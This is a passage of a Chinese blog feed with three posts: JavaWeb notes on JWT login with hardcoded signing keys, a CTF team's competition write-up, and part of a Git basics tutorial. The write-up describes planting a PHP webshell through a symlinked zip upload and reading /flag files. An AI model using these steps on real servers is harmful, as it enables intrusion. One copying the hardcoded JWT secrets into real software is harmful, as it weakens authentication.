Language</td><td>数据控制语言，用来创建数据库用户、控制数据库的访问权限</td></tr></tbody></table><h2 id="四、文件上传"><a href="#四、文件上传" class="headerlink" title="四、文件上传"></a>四、文件上传</h2><h4 id="1、文件上传三要数"><a href="#1、文件上传三要数" class="headerlink" title="1、文件上传三要数"></a>1、文件上传三要数</h4><p>method设置为post</p><p>enctype设置为multipart/form-data</p><p>type设置为file</p><p><img src="/img/JavaWeb/2-1/12.png"></p><h2 id="五、JWT"><a href="#五、JWT" class="headerlink" title="五、JWT"></a>五、JWT</h2><h3 id="1、JWT简介"><a href="#1、JWT简介" class="headerlink" title="1、JWT简介"></a>1、JWT简介</h3><p>全称：JSON Web Token</p><p>官网：<a href="https://jwt.io/">https://jwt.io/</a></p><p>定义了一种简洁的、自包含的格式,用于在通信双方以json数据格式安全的传输信息。由于数字签名的存在，这些信息是可靠的。</p><p>组成:<br>第一部分: Header(头)，记录令牌类型、签名算法等。例如: {“alg”:”HS256”,”type’ ‘:”WT”}<br>第二部分: Payload(有效载荷) ,携带一些自定义信息、 默认信息等。例如: {“id”:”I”,”username”:”Tom”}<br>第三部分: Signature(签名) ，防止Token被篡改、确保安全性。将header. payload, 并加入指定秘钥，通过指定签名算法计算而来。</p><p><img src="/img/JavaWeb/2-1/13.png"></p><p>场景:登录认证。<br>①登录成功后，生成令牌<br>②后续每个请求，都要携带JWT令牌，系统在每次请求处理之前，先校验令牌，通过后，再处理</p><p><img src="/img/JavaWeb/2-1/14.png"></p><p>创造一个JWT</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testGenJwt</span><span class="hljs-params">()</span> &#123;<br>        Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        claims.put(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-number">1</span>);<br>        claims.put(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;tom&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jwt</span> <span class="hljs-operator">=</span> Jwts.builder()<br>                .signWith(SignatureAlgorithm.HS256,<span class="hljs-string">&quot;itheimaitheimaitheimaitheimaitheimaitheimaitheimaitheima&quot;</span>)<br>                .setClaims(claims)<br>                .setExpiration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis()+ <span class="hljs-number">3600</span> * <span class="hljs-number">1000</span>))<br>                .compact();<br>        System.out.println(jwt);<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>解析上面的JWT</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testParseHwt</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Claims</span> <span class="hljs-variable">claims</span> <span class="hljs-operator">=</span> Jwts.parser()<br>            .setSigningKey(<span class="hljs-string">&quot;itheimaitheimaitheimaitheimaitheimaitheimaitheimaitheima&quot;</span>)<br>            .parseClaimsJws(<span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoidG9tIiwiaWQiOjEsImV4cCI6MTY4NTUxODc1OX0.G-3TTiHeKaCvdv_l7qGS_pSOtwt0lPBEe95d4cGQPyQ\n&quot;</span>)<br>            .getBody();<br>    System.out.println(claims);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>JWT过期之后失效无法解析</p><h3 id="2、JWT实例"><a href="#2、JWT实例" class="headerlink" title="2、JWT实例"></a>2、JWT实例</h3><p>JWTUtils工具类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JwtUtils</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">signKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;itheima&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Long</span> <span class="hljs-variable">expire</span> <span class="hljs-operator">=</span> <span class="hljs-number">43200000L</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生成JWT令牌</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> claims JWT第二部分负载 payload 中存储的内容</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateJwt</span><span class="hljs-params">(Map&lt;String, Object&gt; claims)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jwt</span> <span class="hljs-operator">=</span> Jwts.builder()<br>                .addClaims(claims)<br>                .signWith(SignatureAlgorithm.HS256, signKey)<br>                .setExpiration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis() + expire))<br>                .compact();<br>        <span class="hljs-keyword">return</span> jwt;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 解析JWT令牌</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> jwt JWT令牌</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JWT第二部分负载 payload 中存储的内容</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Claims <span class="hljs-title function_">parseJWT</span><span class="hljs-params">(String jwt)</span>&#123;<br>        <span class="hljs-type">Claims</span> <span class="hljs-variable">claims</span> <span class="hljs-operator">=</span> Jwts.parser()<br>                .setSigningKey(signKey)<br>                .parseClaimsJws(jwt)<br>                .getBody();<br>        <span class="hljs-keyword">return</span> claims;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>实现登录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> EmpService empService;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/login&quot;)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Emp emp)</span>&#123;<br>        log.info(<span class="hljs-string">&quot;员工登录: &#123;&#125;&quot;</span>, emp);<br>        <span class="hljs-type">Emp</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> empService.login(emp);<br><br>        <span class="hljs-comment">//登录成功,生成令牌,下发令牌</span><br>        <span class="hljs-keyword">if</span> (e != <span class="hljs-literal">null</span>)&#123;<br>            Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            claims.put(<span class="hljs-string">&quot;id&quot;</span>, e.getId());<br>            claims.put(<span class="hljs-string">&quot;name&quot;</span>, e.getName());<br>            claims.put(<span class="hljs-string">&quot;username&quot;</span>, e.getUsername());<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">jwt</span> <span class="hljs-operator">=</span> JwtUtils.generateJwt(claims); <span class="hljs-comment">//jwt包含了当前登录的员工信息</span><br>            <span class="hljs-keyword">return</span> Result.success(jwt);<br>        &#125;<br><br>        <span class="hljs-comment">//登录失败, 返回错误信息</span><br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;用户名或密码错误&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF国赛-L3tS4fe战队WRITEUP</title>
    <link href="/2023/05/28/CTF_competition_1/"/>
    <url>/2023/05/28/CTF_competition_1/</url>
    
    <content type="html"><![CDATA[<h1 id="L3tS4fe战队WRITEUP"><a href="#L3tS4fe战队WRITEUP" class="headerlink" title="L3tS4fe战队WRITEUP"></a>L3tS4fe战队WRITEUP</h1><h2 id="一、-战队信息"><a href="#一、-战队信息" class="headerlink" title="一、 战队信息"></a>一、 战队信息</h2><p>战队名称：L3tS4fe</p><p>战队排名：700</p><h2 id="二、-解题情况"><a href="#二、-解题情况" class="headerlink" title="二、 解题情况"></a>二、 解题情况</h2><p><img src="/img/CTF/com_1/com-1.png"></p><h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h3><p>linux下建立一个软连接文件指向/var/www/html，这作为第一个zip文件压缩。</p><p>第二个压缩包，先创建一个test目录，在test目录下写一个shell文件cmd.php，此时压缩包目录架构是：test/cmd.php</p><p>访问cmd.php，输入执行的指令，获得flag</p><h3 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h3><p>输入指令print(open(‘/flag’).read())</p><p>flag{06c7b3f2-5ba7-4c40-a161-13348cc57223}</p><h3 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h3><p>在文件中找到网站，打开网站解析文件。</p><p>然后发现一个加密的流程，打开加密流程，分析过程。</p><p>在secret模块中，添加一个打印模块，记录下所有数据。</p><p>根据后续的代码，编写一个解密异或代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> a[] = &#123;<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>,<span class="hljs-number">74</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">75</span>,<span class="hljs-number">20</span>,<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">8</span>,<span class="hljs-number">28</span>,<span class="hljs-number">25</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">7</span>,<span class="hljs-number">28</span>,<span class="hljs-number">76</span>,<span class="hljs-number">88</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">29</span>,<span class="hljs-number">73</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">4</span>,<span class="hljs-number">87</span>,<span class="hljs-number">87</span>,<span class="hljs-number">82</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">4</span>,<span class="hljs-number">85</span>,<span class="hljs-number">87</span>,<span class="hljs-number">30</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">42</span>; i++) &#123;<br>        a[i] = a[i] ^ a[i<span class="hljs-number">-1</span>];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功获得flag</p><p>flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p><h3 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a>被加密的生产流量</h3><p>在流量中找到一串前面相同，最后2位不同的字符，发现最后以=结束，将其全部连接起来，用base16解析，成功获得flag</p><p><img src="/img/CTF/com_1/com-2.png"></p><h3 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h3><p><img src="/img/CTF/com_1/com-3.png"></p><p><img src="/img/CTF/com_1/com-4.png"><br>看到ctf数据库和flag1表，查查看<br><img src="/img/CTF/com_1/com-5.png"><br>fake_flag<br><img src="/img/CTF/com_1/com-6.png"><br>不在mysql里</p><p>于是看打印出来的日志<br><img src="/img/CTF/com_1/com-7.png"></p><p><img src="/img/CTF/com_1/com-8.png"><br>没发现什么有用的信息<br>但题目是dumpit，应该就在里面找<br>试了半天想到docker的env可能有没删除的flag，于是<br><img src="/img/CTF/com_1/com-9.png"><br>找到flag（这应该是非预期解，预期解是命令执行吧。。。)</p><h3 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h3><p>首先打开文件得到</p><p><img src="/img/CTF/com_1/com-10.png"></p><p>猜测第一行是base64加密，但解出来不对，所以猜测是换表加密，第二行是url加密，解密第二行得到</p><p>GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5</p><p>换表解密得到flag</p><p><img src="/img/CTF/com_1/com-11.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git知识与使用-1</title>
    <link href="/2023/05/25/Git_1/"/>
    <url>/2023/05/25/Git_1/</url>
    
    <content type="html"><![CDATA[<h1 id="Git知识与使用-1"><a href="#Git知识与使用-1" class="headerlink" title="Git知识与使用-1"></a>Git知识与使用-1</h1><h2 id="一、Git基础知识"><a href="#一、Git基础知识" class="headerlink" title="一、Git基础知识"></a>一、Git基础知识</h2><h3 id="1、Git的工作流程"><a href="#1、Git的工作流程" class="headerlink" title="1、Git的工作流程"></a>1、Git的工作流程</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Git</span>是分布式版本控制系统（<span class="hljs-built_in">Distributed</span> <span class="hljs-built_in">Version</span> <span class="hljs-built_in">Control</span> <span class="hljs-variable">System</span>，简称 <span class="hljs-variable">DVCS</span>），分为两种类型的仓库：<br>本地仓库和远程仓库<br>工作流程如下<br>    <span class="hljs-number">1</span>．从远程仓库中克隆或拉取代码到本地仓库<span class="hljs-punctuation">(</span><span class="hljs-variable">clone</span><span class="hljs-operator">/</span><span class="hljs-variable">pull</span><span class="hljs-punctuation">)</span><br>    <span class="hljs-number">2</span>．从本地进行代码修改<br>    <span class="hljs-number">3</span>．在提交前先将代码提交到暂存区<br>    <span class="hljs-number">4</span>．提交到本地仓库。本地仓库中保存修改的各个历史版本<br>    <span class="hljs-number">5</span>．修改完成后，需要和团队成员共享代码时，将代码<span class="hljs-variable">push</span>到远程仓库<br></code></pre></td></tr></table></figure><p><img src="/img/Git/1/git.png"></p><p>总结:git和svn的区别</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> svn 是集中式版本控制工具,git 是分布式版本控制工具<br><span class="hljs-bullet">2.</span> svn 不支持离线提交,git 支持离线提交代码<br></code></pre></td></tr></table></figure><h3 id="2、Git-的安装下载"><a href="#2、Git-的安装下载" class="headerlink" title="2、Git 的安装下载"></a>2、Git 的安装下载</h3><p>下载地址： <a href="https://git-scm.com/download">https://git-scm.com/download</a></p><h2 id="二、Git-工作流程"><a href="#二、Git-工作流程" class="headerlink" title="二、Git 工作流程"></a>二、Git 工作流程</h2><h3 id="1、Git流程图"><a href="#1、Git流程图" class="headerlink" title="1、Git流程图"></a>1、Git流程图</h3><p><img src="/img/Git/1/git%E6%B5%81%E7%A8%8B.png"></p><p>概念即详解</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">本地仓库：是在开发人员自己电脑上的Git仓库,存放我们的代码(.git 隐藏文件夹就是我们的本地仓库)<br>远程仓库：是在远程服务器上的Git仓库,存放代码(可以是github.com或者gitee.com 上的仓库,或者自己该公司的服务器)<br>工作区: 我们自己写代码(文档)的地方<br><span class="hljs-section">暂存区: 在 本地仓库中的一个特殊的文件(index) 叫做暂存区,临时存储我们即将要提交的文件</span><br><span class="hljs-section">------------</span><br>Clone：克隆，就是将远程仓库复制到本地仓库<br>Push：推送，就是将本地仓库代码上传到远程仓库<br>Pull：拉取，就是将远程仓库代码下载到本地仓库,并将代码 克隆到本地工作区<br></code></pre></td></tr></table></figure><p><img src="/img/Git/1/git%E6%B5%81%E7%A8%8B_%E8%AF%A6%E8%A7%A3.png"></p><p>文件状态讲解</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Git</span>工作目录下的文件存在两种状态：<br><span class="hljs-attribute">1</span> untracked 未跟踪（未被纳入版本控制） :  比如新建的文件(此时文件夹上没有图标或者有一个<span class="hljs-string">&quot;问号&quot;</span>)<br><span class="hljs-attribute">2</span> tracked 已跟踪（被纳入版本控制）     <br>    <span class="hljs-attribute">2</span>.<span class="hljs-number">1</span> Staged 已暂存状态            : 添加 但未提交状态(此时文件夹上有一个<span class="hljs-string">&quot;加号&quot;</span>)<br><span class="hljs-attribute">2</span>.<span class="hljs-number">2</span> Unmodified 未修改状态        : 已提交(此时文件夹上有一个<span class="hljs-string">&quot;对号&quot;</span>)<br><span class="hljs-attribute">2</span>.<span class="hljs-number">3</span> Modified 已修改状态          : 修改了,但是还没有提交 (此时文件夹上有一个<span class="hljs-string">&quot;红色感叹号&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="2、分支"><a href="#2、分支" class="headerlink" title="2、分支"></a>2、分支</h3><p>几乎所有的版本控制系统都以某种形式支持分支。 使用分支意味着你可以把你的工作从开发主线上分离开来，避免影响开发主线。多线程开发,可以同时开启多个任务的开发,多个任务之间互不影响.</p><p>为何要使用分支：</p><p>先看单线程开发</p><p><img src="/img/Git/1/1572173978185.png"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gcode">思考如下现象<br>    <span class="hljs-number">10.1</span> 日 业务部门提出需求 : 明年 元旦<span class="hljs-number">3</span>天做<span class="hljs-number">2</span>个促销活动<br><span class="hljs-number">1</span>) <span class="hljs-number">12.31</span> 号上线活动<span class="hljs-number">1</span>, <br><span class="hljs-number">2</span>) <span class="hljs-number">1.4</span> 号上线活动<span class="hljs-number">2</span> ,同时 要求撤销 活动<span class="hljs-number">1</span><br>    你所在部门领导为了保证能顺利完成,要求 <span class="hljs-number">11.15</span> 号完成上述连个功能的开发工作<br>此时作为开发人员:我要面临两个文件, 活动<span class="hljs-number">1</span> 的代码,即要存在<span class="hljs-comment">(12.31 要用)</span>又要不存在<span class="hljs-comment">(1.4 号要求删除)</span>,我们怎么做?<br>显然比较棘手,如果使用分支<span class="hljs-comment">(可以理解为将代码复制一份)</span>将很好解决<br></code></pre></td></tr></table></figure><p><img src="/img/Git/1/1572174740013.png"></p><h3 id="3、标签"><a href="#3、标签" class="headerlink" title="3、标签"></a>3、标签</h3><p>如果你的项目达到一个重要的阶段，并希望永远记住那个特别的提交快照，你可以给它打上标签(tag)<br>比如说，我们想为我们的项目发布一个”1.0”版本。 我们给最新一次提交打上（HEAD）”v1.0”的标签。<br>标签可以理解为项目里程碑的一个标记,一旦打上了这个标记则,表示当前的代码将不允许提交</p><h2 id="三、Git的连接与配置"><a href="#三、Git的连接与配置" class="headerlink" title="三、Git的连接与配置"></a>三、Git的连接与配置</h2><h3 id="1、SSH连接概述"><a href="#1、SSH连接概述" class="headerlink" title="1、SSH连接概述"></a>1、SSH连接概述</h3><p>实际上git 不仅仅支持用户名密码方式的配置,可以有另外一种相对更加安全的配置即ssh方式配置</p><p>ssh方式的底层原理：</p><p>ssh连接地城是RAS加密算法,又称非对称加密,是一种现在公认的最安全的加密方式<br>数学基础好的同学可以研究一下<br><a href="https://www.cnblogs.com/cjm123/p/8243424.html">https://www.cnblogs.com/cjm123/p/8243424.html</a></p><p>公钥私钥加密可以看作古代 的”虎符” , 我们本地电脑有一份,远程服务器有一份, 只要 “虎符” 核对通过表示身份无误,可以执行提交等操作,无需输入用户名密码</p><h3 id="2、生成和使用公钥私钥"><a href="#2、生成和使用公钥私钥" class="headerlink" title="2、生成和使用公钥私钥"></a>2、生成和使用公钥私钥</h3><p>生成公钥私钥：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p> 一直回车即可<br> 会默认用户目录 .ssh 目录生成一个默认的id_rsa文件 和id_rsa.pub</p><p><img src="/img/Git/1/1572520139221.png"></p><p><img src="/img/Git/1/1572520293700.png"></p><p>ssh密钥配置：</p><p>在Git仓库，上传RSA公钥</p><p><img src="/img/Git/1/1572520396806.png"></p><h2 id="四、git基本操作"><a href="#四、git基本操作" class="headerlink" title="四、git基本操作"></a>四、git基本操作</h2><h3 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>​    上述我们的操作 使用的 是客户端TortoiseGit 操作的git ,实际上底层依旧是使用的命令行帮我们执行, 在早期 git 并没有窗口化工具,开发人员只能使用命令行模式</p><p>  实际上,如果你掌握并熟练使用了命令行模式操作git 的话,你会发现某些操作命令行比窗口化操作要简单</p><p>所有你在工作中会发现高深的技术人员可能会喜欢命令行模式提交git</p><h4 id="1-1、环境配置"><a href="#1-1、环境配置" class="headerlink" title="1.1、环境配置"></a>1.1、环境配置</h4><p>当安装Git后首先要做的事情是设置用户名称和email地址。这是非常重要的，因为每次Git提交都会使用该用户信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">设置用户信息</span> <br>   git config --global user.name “itcast”<br>   git config --global user.email “itcast@itcast.cn”<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看配置信息</span><br>   git config --list<br>   git config user.name<br><span class="hljs-meta prompt_">#</span><span class="language-bash">通过上面的命令设置的信息会保存在~/.gitconfig文件中</span><br><br></code></pre></td></tr></table></figure><h4 id="1-2、初始化本地仓库-init"><a href="#1-2、初始化本地仓库-init" class="headerlink" title="1.2、初始化本地仓库 init"></a>1.2、初始化本地仓库 init</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">初始化仓库带工作区</span><br>git init<br><span class="hljs-meta prompt_"># </span><span class="language-bash">初始化仓库不带工作区</span><br>git init --bare  <br></code></pre></td></tr></table></figure><h4 id="1-3、克隆-clone"><a href="#1-3、克隆-clone" class="headerlink" title="1.3、克隆 clone"></a>1.3、克隆 clone</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">从远程仓库克隆</span><br>git clone 远程Git仓库地址 <br>例如: git clone https://gitee.com/itcast/gittest.git<br></code></pre></td></tr></table></figure><h4 id="1-4、查看状态-status"><a href="#1-4、查看状态-status" class="headerlink" title="1.4、查看状态 status"></a>1.4、查看状态 status</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看状态</span><br>git status <br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看状态 使输出信息更加简洁</span><br>git status –s <br></code></pre></td></tr></table></figure><h4 id="1-5、add"><a href="#1-5、add" class="headerlink" title="1.5、add"></a>1.5、add</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">将未跟踪的文件加入暂存区</span><br>git add  &lt;文件名&gt;  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">将暂存区的文件取消暂存 (取消 add )</span><br>git reset  &lt;文件名&gt;  <br><br></code></pre></td></tr></table></figure><h4 id="1-6、commit"><a href="#1-6、commit" class="headerlink" title="1.6、commit"></a>1.6、commit</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">git commit 将暂存区的文件修改提交到本地仓库</span><br>git commit -m &quot;日志信息&quot;  &lt;文件名&gt;  <br><br></code></pre></td></tr></table></figure><h4 id="1-7、删除-rm"><a href="#1-7、删除-rm" class="headerlink" title="1.7、删除 rm"></a>1.7、删除 rm</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">从本地工作区 删除文件</span><br>git rm &lt;文件名&gt;  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果本工作区库误删, 想要回退</span><br>git checkout head &lt;文件名&gt;  <br></code></pre></td></tr></table></figure><h3 id="2、git-远程仓库操作"><a href="#2、git-远程仓库操作" class="headerlink" title="2、git 远程仓库操作"></a>2、git 远程仓库操作</h3><h4 id="2-1、查看远程"><a href="#2-1、查看远程" class="headerlink" title="2.1、查看远程"></a>2.1、查看远程</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看远程  列出指定的每一个远程服务器的简写</span><br>git remote <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看远程 , 列出 简称和地址</span><br>git 